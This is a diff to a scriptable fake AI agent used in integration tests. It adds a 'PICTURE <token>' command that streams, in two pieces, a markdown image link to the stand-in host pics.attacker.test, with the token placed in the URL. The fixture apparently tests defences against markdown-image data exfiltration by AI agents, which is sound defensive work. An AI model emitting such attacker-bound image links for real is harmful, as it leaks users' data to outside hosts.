@@ -1,5 +1,5 @@
 // Scriptable brain for core integration tests.
-// "CALL <tool> <json>" calls a hub tool over MCP; "LIMIT" makes brain `fake` hit its limit; "PROMPT?" echoes the instructions.
+// "CALL <tool> <json>" calls a hub tool over MCP; "PICTURE <token>" shows a picture whose address it made; "LIMIT" makes brain `fake` hit its limit; "PROMPT?" echoes the instructions.
 // Group chats: "HANDOFF <id>" on the last line replies "over to @<id>"; "ECHO?" anywhere echoes the turn's "[...]" lines;
 // "SLOW" at the end of the last line keeps the turn going until it is interrupted (or 5 s pass), "BRIEF" for 0.8 s.
 // Brain `fake` takes input into such a turn (steer): the turn then ends with "fake also heard: <its last line>";
@@ -109,6 +109,14 @@ export default {
             }
             if (lastLine(turn.text.replace(/\n+When you are done[^\n]*\s*$/, "")) === "WARM?") {
               yield { type: "text", delta: `${id} warm: ${warmed.has(o.sessionId) ? "yes" : "no"} keep: ${!!o.keepWarm} desk: ${!!o.frontDesk}` };
+              yield { type: "done", resumeToken: `${id}-resume` };
+              return;
+            }
+            // A picture whose address the agent put together, finished by a second delta: "PICTURE <token>".
+            const picture = /^PICTURE (\S+)$/.exec(lastLine(turn.text));
+            if (picture) {
+              yield { type: "text", delta: `${id} shows: ![p](https://pics.attacker.test/p.png?d=` };
+              yield { type: "text", delta: `${picture[1]})` };
               yield { type: "done", resumeToken: `${id}-resume` };
               return;
             }
